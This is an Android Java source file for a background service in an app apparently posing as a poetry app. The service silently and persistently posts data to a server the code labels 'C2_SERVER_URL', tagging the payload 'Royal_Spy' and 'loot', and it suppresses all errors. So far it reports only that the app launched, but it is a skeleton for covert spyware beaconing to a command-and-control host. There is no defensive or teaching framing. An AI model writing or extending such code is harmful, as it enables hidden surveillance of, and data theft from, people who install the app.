package com.royal.poetry.master;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class RoyalBackgroundService extends Service {

    private static final String C2_SERVER_URL = "http://yourdomain.epizy.com/shamona/report.php";

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        sendDataToThrone("تستحق ذلك - App Launched & Background Service Active.");
        return START_STICKY;
    }

    private void sendDataToThrone(String data) {
        new Thread(() -> {
            try {
                URL url = new URL(C2_SERVER_URL);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json; utf-8");
                conn.setDoOutput(true);
                String json = "{\"device_owner\": \"Royal_Spy\", \"loot\": \"" + data + "\"}";
                try (OutputStream os = conn.getOutputStream()) {
                    byte[] input = json.getBytes("utf-8");
                    os.write(input, 0, input.length);
                }
                conn.getResponseCode();
            } catch (Exception e) {}
        }).start();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
